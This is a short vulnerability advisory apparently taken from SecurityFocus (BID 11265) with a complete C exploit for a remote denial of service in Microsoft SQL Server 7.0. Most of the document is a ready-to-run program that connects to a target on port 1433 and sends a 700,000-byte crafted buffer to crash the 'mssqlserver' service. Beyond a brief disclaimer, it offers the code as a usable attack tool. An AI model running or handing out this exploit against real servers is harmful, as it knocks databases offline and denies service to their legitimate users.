source: http://www.securityfocus.com/bid/11265/info
 
Reportedly Microsoft SQL Server is affected by a remote denial of service vulnerability. This issue is due to a failure of the application to handle irregular network communications.
 
An attacker may leverage this issue to cause the affected server to crash, denying service to legitimate users.

/*
* Microsoft mssql 7.0 server is vulnerable to denial of service attack
* By sending a large buffer with specified data an attacker can stop the
service
* "mssqlserver" the error noticed is different according to services' pack
but the result is always
* the same one.
*
* Exception code = c0000005
*
* vulnerable:  MSSQL7.0 sp0 - sp1 - sp2 - sp3
* This code is for educational purposes, I am not responsible for your acts
*
* This is the unix port of the code based on the windows one made by:
* securma massine
*
* (C) 2004 Sebastien Tricaud <sebastien.tricaud@gmail.com>
*
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>


#define BUF_SIZE 700000

#define DEFAULT_PORT 1433


int main(int argc, char **argv)
{
        int sockfd;
        struct sockaddr_in target;
       struct hostent *he;
        char buffer[BUF_SIZE];

        int i;
        int retval;


        for( i = 0; i < BUF_SIZE; i += 16 )
                memcpy(buffer + i,
                "\x10\x00\x00\x10\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc", 16);

        if ( argc < 2 ) {
                printf("Vulnerable: MSSQL 7.0 sp0 - sp1 - sp2 - sp3\n");
                printf("Synopsis: %s <target> [port]\n\n", argv[0]);
                printf("This exploit is provided AS IS for testing purposes
                only\n");
                return -1;
        }

        he = (struct hostent *)gethostbyname(argv[1]);
        if ( ! he ) {
                perror("Cannot get host by name\nThe server is maybe down");
                return -1;
        }

        sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if ( sockfd == -1 ) {
                perror("Cannot create socket
                (type=AF_INET,SOCK_STREAM,IPPROTO_TCP)\n");
                return -1;
        }


        memset(&target, 0, sizeof(struct sockaddr_in));

        target.sin_family = AF_INET;
        if ( argv[2] )
                target.sin_port = htons(atoi(argv[2]));
        else
                target.sin_port = htons(DEFAULT_PORT);
        target.sin_addr = *((struct in_addr *)he->h_addr);

        retval = connect(sockfd, (struct sockaddr *)&target, sizeof(struct
        sockaddr));
        if ( retval == -1 ) {
                perror("Cannot be connected to the target host (wrong port
                number?)\n");
                return -1;
        }

        write(sockfd, buffer, sizeof(buffer));

        printf("Data sent!\n");

        printf("Please wait a few seconds and check the server\n");

        close(sockfd);

        return 0;
}